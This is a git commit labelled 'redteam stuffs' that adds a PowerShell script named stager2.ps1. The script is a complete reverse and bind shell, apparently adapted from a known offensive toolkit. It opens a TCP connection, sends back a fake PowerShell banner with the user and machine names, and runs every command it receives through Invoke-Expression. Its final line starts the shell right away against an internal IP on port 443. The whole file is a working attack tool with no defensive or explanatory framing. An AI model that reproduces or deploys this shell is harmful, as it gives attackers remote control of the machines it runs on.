ddc35588fa87675d99c327ab6862071775d30935
r00tkill3d <yassinsabir11@gmail.com>
2021-06-03 16:31:10 -0400

    redteam stuffs

---
+++ stager2.ps1
@@ -0,0 +1,91 @@
+function Invoke-PowerShellTcp 
+{ 
+      
+    [CmdletBinding(DefaultParameterSetName="coolio")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="coolio")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="goldie")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="coolio")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="goldie")]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName="coolio")]
+        [Switch]
+        $Coolio,
+
+        [Parameter(ParameterSetName="goldie")]
+        [Switch]
+        $Goldie
+
+    )
+
+    
+    try 
+    {
+        
+        if ($Coolio)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        }
+
+        
+        if ($Goldie)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+
+        
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Coolio -IPAddress 172.16.70.10 -Port 443
